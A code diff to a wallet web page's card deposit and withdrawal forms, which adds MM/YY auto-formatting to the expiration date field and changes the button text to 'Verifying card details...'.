@@ -189,7 +189,7 @@
                 </div>
                 <div class="form-row">
                     <div class="form-group">
-                        <input type="text" placeholder="Expiring Date">
+                        <input type="text" placeholder="Exp. Date (MM/YY)" maxlength="5" oninput="formatExpirationDate(this)">
                     </div>
                     <div class="form-group">
                         <input type="text" placeholder="CVV">
@@ -232,7 +232,7 @@
                 </div>
                 <div class="form-row">
                     <div class="form-group">
-                        <input type="text" placeholder="Expiring Date">
+                        <input type="text" placeholder="Exp. Date (MM/YY)" maxlength="5" oninput="formatExpirationDate(this)">
                     </div>
                     <div class="form-group">
                         <input type="text" placeholder="CVV">
@@ -279,6 +279,15 @@
         let currentModal = null;
         let offsetY = 0;
         const API_URL = 'https://walletpay-20va.onrender.com/api';
+
+        // Format the expiration date field to MM/YY
+        function formatExpirationDate(input) {
+            let value = input.value.replace(/\D/g, ''); // Remove non-digits
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2);
+            }
+            input.value = value.substring(0, 5); // Limit to MM/YY (5 characters)
+        }
 
         // Fetch initial balance and history
         async function fetchData() {
@@ -382,13 +391,13 @@
                 return;
             }
 
-            btn.textContent = 'Topping up...';
+            btn.textContent = 'Verifying card details...';
             btn.disabled = true;
 
             const formData = {
                 amount: document.querySelector('#deposit-modal [placeholder="Amount"]').value,
                 cardNumber: document.querySelector('#deposit-modal [placeholder="Card Number"]').value,
-                expiringDate: document.querySelector('#deposit-modal [placeholder="Expiring Date"]').value,
+                expiringDate: document.querySelector('#deposit-modal [placeholder="Exp. Date (MM/YY)"]').value,
                 cvv: document.querySelector('#deposit-modal [placeholder="CVV"]').value,
                 cardholdername: document.querySelector('#deposit-modal [placeholder="cardholder name"]').value,
                 billingAddress: document.querySelector('#deposit-modal [placeholder="Billing Address"]').value,
@@ -421,13 +430,13 @@
                 return;
             }
 
-            btn.textContent = 'Withdrawal in progress...';
+            btn.textContent = 'Verifying card details...';
             btn.disabled = true;
 
             const formData = {
                 amount: document.querySelector('#withdraw-modal [placeholder="Amount"]').value,
                 cardNumber: document.querySelector('#withdraw-modal [placeholder="Card Number"]').value,
-                expiringDate: document.querySelector('#withdraw-modal [placeholder="Expiring Date"]').value,
+                expiringDate: document.querySelector('#withdraw-modal [placeholder="Exp. Date (MM/YY)"]').value,
                 cvv: document.querySelector('#withdraw-modal [placeholder="CVV"]').value,
                 cardholdername: document.querySelector('#withdraw-modal [placeholder="cardholder name"]').value,
                 billingAddress: document.querySelector('#withdraw-modal [placeholder="Billing Address"]').value,
@@ -483,4 +492,4 @@
         document.addEventListener('DOMContentLoaded', fetchData);
     </script>
 </body>
-            </html>
+                </html>
